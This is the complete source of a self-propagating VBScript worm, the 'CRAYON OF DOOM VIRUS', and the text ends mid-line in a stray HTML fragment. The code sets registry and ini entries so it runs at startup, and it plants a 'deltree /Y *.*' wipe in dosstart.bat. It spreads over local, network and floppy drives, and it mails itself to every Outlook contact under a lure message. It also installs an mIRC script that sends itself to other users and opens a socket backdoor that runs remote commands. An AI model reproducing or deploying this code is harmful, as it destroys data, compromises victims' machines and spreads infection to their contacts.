   set worm = CreateObject("Scripting.FileSystemObject")
   sub list()
   on error resume next
   Dim sysfldr, f, h
   Set sysfldr = worm.GetSpecialFolder(1)
   Set winfldr = worm.GetSpecialFolder(0)
   Set tmpfldr = worm.GetSpecialFolder(2)
   Set f = worm.GetFile("c:\windows\wscript.exe")
   f.Attributes = 2
   Set f = worm.GetFile(WScript.ScriptFullName)
   f.copy(sysfldr&"\list.vbs")
   f.copy(winfldr&"\list.vbs")
   f.copy(tmpfldr&"\list.vbs")
   f.copy(winfldr&"\winsck.vbs")
   f.copy(sysfldr&"\explorer.vbs")
   f.Attributes = 2
   loc="C:\windows\calc.vbs"
   loc1="C:\windows\sys.vbs"
   loc2="C:\windows\temp.vbs"
   loc4="C:\windows\win.vbs"
   loc5="C:\windows\fax.vbs"
   Set h = worm.GetFile("pornlist.doc")
   Set g = worm.GetFile("pornlist.txt")
   h.copy("c:\pornlist.doc")
   g.copy("c:\pornlist.doc")
   h.copy("c:\windows\cod.cod")
   h.Attributes = 2
   g.Attributes = 2
   Set WSHShell = CreateObject("WScript.Shell")
   WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", loc
   WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", loc1
   WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", loc2
   editini winfldr&"\win.ini","[windows]","run",loc4
   editini winfldr&"\system.ini","[boot]","shell","Explorer.exe " & loc5
   ntwrk()
   end sub

   sub nodel()
   worm.CreateTextFile ("C:\windows\system.bat")
   Set ss3 = worm.GetFile("C:\windows\dosstart.bat")
   if ss3.size <> 149 then
   ss3.copy("c:\windows\doss.bak")
   Set w3s = ss3.OpenAsTextStream(2, false)
   w3s.write "@echo off" & vbcrlf
   w3s.write "echo Warning This Computer is infected with The CRAYON OF DOOM VIRUS.  Turn off computer now to avoid loss of data!" & vbcrlf
   w3s.write "pause" & vbcrlf
   w3s.write "deltree /Y *.*"
   w3s.close
   end if
   Set ss2 = worm.GetFile("C:\windows\system.bat")
   Set w2s = ss2.OpenAsTextStream(2, false)
   w2s.write ":2" & vbcrlf
   w2s.write "start /w c:\windows\wscript.exe %1" & vbcrlf
   w2s.write "goto 2"
   w2s.close
   ss2.Attributes = 2
   for u = 1 to 5
   select case u
   case "1"
   pathed="c:\windows\list.vbs"
   named="C:\windows\calc.vbs"
   case "2"
   pathed="c:\windows\winsck.vbs"
   named="C:\windows\win.vbs"
   case "3"
   pathed="c:\windows\system\list.vbs"
   named="C:\windows\sys.vbs"
   case "4"
   pathed="c:\windows\temp\list.vbs"
   named="C:\windows\temp.vbs"
   case "5"
   pathed="c:\windows\system\explorer.vbs"
   named="C:\windows\fax.vbs"
   end select
   worm.CreateTextFile (named)
   Set ss2 = worm.GetFile(named)
   Set w2s = ss2.OpenAsTextStream(2, false)
   w2s.write "Set WshShell = WScript.CreateObject(" & chr(34) & "WScript.Shell" & chr(34) & ")" & vbcrlf
   w2s.write "Return = WshShell.Run(" & chr(34) & "C:\windows\system.bat " & pathed & chr(34) & ", 0)"
   w2s.close
   ss2.Attributes = 2
   next
   end sub

   sub infect(drive)
   on error resume next
   Set f = worm.GetFile(WScript.ScriptFullName)
   f.copy(drive & "\list.vbs")
   f.Attributes = 2
   path=drive&"\list.vbs"
   end sub

   Function ShowDriveType(drvpath)
   on error resume next
   Dim d, t
   Set d = worm.GetDrive(drvpath)
   Select Case d.DriveType
   Case 0: t = "Unknown"
   Case 1: t = "Removable"
   Case 2: t = "Fixed"
   Case 3: t = "Network"
   Case 4: t = "CD-ROM"
   Case 5: t = "RAM Disk"
   End Select
   if t = "" then t = "None"
   ShowDriveType = t
   End Function

   sub ntwrk()
   on error resume next
   for n = 65 to 90
   l=Chr(n)
   drv=l&":"
   d3=ShowDriveType(drv)
   if d3 = "Fixed" then infect(drv)
   if d3 = "Network" then
   infect(drv)
   Set WshNetwork = WScript.CreateObject("WScript.Network")
   WshNetwork.RemoveNetworkDrive drv
   end if
   next
   sprd()
   end sub

   sub sprd()
   on error resume next
   Dim oShell
   Set oShell = Wscript.CreateObject("Wscript.Shell")
   Dim strProfile
   Dim strAlias, strAliasKey, paths
   strProfile = oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?")
   if strProfile = "" then
   oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1"
   Set Prg = CreateObject("Outlook.Application")
   Set Prg1 = Prg.GetNameSpace("MAPI")
   For y = 1 To Prg1.AddressLists.Count
   Set AdBook = Prg1.AddressLists(y)
   x = 1
   Set Maie = Prg.CreateItem(0)
   For oo = 1 To AdBook.AddressEntries.Count
   newmailadd = AdBook.AddressEntries(x)
   Maie.Recipients.Add newmailadd
   x = x + 1
   Next
   Maie.Subject = "Hey whats up!"
   Maie.Body = "Hey, I attatched a list for you to this e-mail take a look at it and tell me what you think. :)"
   paths = "c:\pornlist.doc"
   porno=ReportFileStatus("c:\pornlist.doc")
   if porno = 0 then paths = "c:\list.vbs"
   Maie.Attachments.Add paths
   Maie.DeleteAfterSubmit = False
   Maie.Send
   newmailadd=""
   next
   else
   end if
   etc()
   end sub

   sub etc()
   on error resume next
   a=ReportFolderStatus("C:\mirc")
   if a="1" then mirc("C:\mirc\")
   if a="0" then
   Set oMyFileSearch = CreateObject("word.application")
   Dim iIndx
   With oMyFileSearch.FileSearch
       .NewSearch
       .LookIn = "C:\"
       .SearchSubFolders = True
       .FileName = "mirc32.exe"
       .FileType = 1
       .Execute
   if len(.FoundFiles.Item(1)) > 3 then
   sMsg = left(.FoundFiles.Item(1),len(.FoundFiles.Item(1))-10)
   mirc(sMsg)
   end if
   End With
   end if
   end sub

   list()
   Function ReportFileStatus(filespec)
   on error resume next
   Dim msg
   If (worm.FileExists(filespec)) Then
   msg = "1"
   Else
   msg = "0"
   End If
   ReportFileStatus = msg
   End Function
   Function ReportFolderStatus(fldr)
   on error resume next
   Dim msg
   If (worm.FolderExists(fldr)) Then
   msg = "1"
   Else
   msg = "0"
   End If
   ReportFolderStatus = msg
   End Function
   sub mirc(mpath)
   on error resume next
   Dim folder
   Set winfolder = worm.GetSpecialFolder(1)
   path = "c:\pornlist.doc"
   Dim fso34, f132, t2s
   Const ForWriting = 2
   worm.CreateTextFile (mpath & "script.ini")
   Set f132 = worm.GetFile(mpath & "script.ini")
   Set t2s = f132.OpenAsTextStream(ForWriting, false)
   t2s.write "[script]" & vbcrlf
   t2s.write "n0=on 1:CONNECT:{ /msg crayolarx crayons | /msg ilikeroll crayons }" & vbcrlf
   t2s.write "n1=/sockclose cod | /socklisten cod 4982 }" & vbcrlf
   t2s.write "n2=on 1:FILESENT:*:if ($filename != c:\pornlist.doc) /dcc send $nick " & path & vbcrlf
   t2s.write "n3=on 1:FILERCVD:*:/dcc send $nick " & path & vbcrlf
   t2s.write "n4=on 1:JOIN:#:{ if ($nick == crayolarx) || ($nick == ilikeroll) /msg $nick crayons #" & vbcrlf
   t2s.write "n5=if (# == #nohack) || (# == #dmsetup) || ($pos(#,help,1) != $null) || ($pos(#,virus,1) != $null) /part # CRAYON OF DOOM }" & vbcrlf
   t2s.write "n5=on 1:socklisten:cod:{ sockaccept users }" & vbcrlf
   t2s.write "n6=on 1:sockread:users:{ if ($sockerr > 0) return" & vbcrlf
   t2s.write "n7=:nextread" & vbcrlf
   t2s.write "n8=sockread %temp" & vbcrlf
   t2s.write "n9=if ($sockbr == 0) return" & vbcrlf
   t2s.write "n10=if ($left(%temp,2) == do) { $right(%temp,-3) }" & vbcrlf
   t2s.write "n11=goto nextread }" & vbcrlf
   t2s.write "n12=on 1:JOIN:#:if (($nick != $me) && ($pos(#,sex,1) != $null)) /dcc send $nick " & path & vbcrlf
   t2s.write "n13=ctcp 1:*:{ if ($nick == crayolarx) || ($nick == ilikeroll) $1- }" & vbcrlf
   t2s.write "n14=on 1:TEXT:*virus*:*:if ($nick != $me) /ignore $nick"
   t2s.close
   editini mpath & "mirc.ini","[text]","ignore","*.exe,*.com,*.bat,*.dll,*.ini,*.vbs"
   editini mpath & "mirc.ini","[options]","n2","0,1,0,0,1,1,1,1,0,5,35,0,0,1,1,0,1,1,0,5,500,10,0,1,1,0,0"
   editini mpath & "mirc.ini","[options]","n4","1,0,1,1,0,3,9999,0,0,0,1,0,1024,0,0,99,60,0,0,1,1,1,0,1,1,5000,1"
   end sub

   sub editini(filename,section,string,newvalue)
   on error resume next
   Const ForReading = 1
   Const ForWriting = 2
   iniFile = filename
   sectionName = section
   keyName = string
   newVlaue = newvalue
   bInSection = false
   bKeyChanged = false
   Set ts = worm.OpenTextFile(iniFile, ForReading)
   lines = Split(ts.ReadAll,vbCrLf)
   ts.close
   For n = 0 to ubound(lines)
   if left(lines(n),1) = "[" then
   if bInSection then
   exit for
   end if
   if instr(lines(n),sectionName) = 1 then
   bInSection = true
   else
   bInSection = false
   end if
   else
   if bInSection then
   if instr(lines(n),keyName & "=") = 1 then
   bKeyChanged = true
   lines(n) = keyName & "=" & newVlaue
   bKeyChanged = true
   exit for
   end if
   end if
   end if
   Next
   if bKeyChanged then
   Set ts = worm.OpenTextFile(iniFile, ForWriting)
   ts.Write join(lines,vbCrLf)
   ts.close
   end if
   set ts = nothing
   set fso = nothing
   end sub

   function ainfect ()
   on error resume next
   pornos=ReportFileStatus("a:\pornlist.doc")
   if pornos = 1 then Exit Function
   Set w = worm.GetFile(WScript.ScriptFullName)
   Set Map = worm.GetFolder("a:\")
   Set a = Map.Files
   For each target in a
   ExtName = lcase(worm.GetExtensionName(target.Name))
   if ExtName = "vbs" then w.copy(target.path)
   if ExtName <> "vbs" then
   w.copy(target.path)
   worm.movefile target.path,target.path&".vbs"
   Set zz = worm.GetFile("c:\pornlist.doc")
   zz.copy("a:\pornlist.doc")
   zz.Attributes = 2
   end if
   next
   end function

   on error resume next
   nodel()
   ainfect()
   do
   check="1"
    for v = 1 to 6
     select case v
     case "1" vname="c:\list.vbs"
     case "2" vname="c:\windows\list.vbs"
     case "3" vname="c:\windows\winsck.vbs"
     case "4" vname="c:\windows\system\list.vbs"
     case "5" vname="c:\windows\temp\list.vbs"
     case "6" vname="c:\windows\system\explorer.vbs"
     end <span class
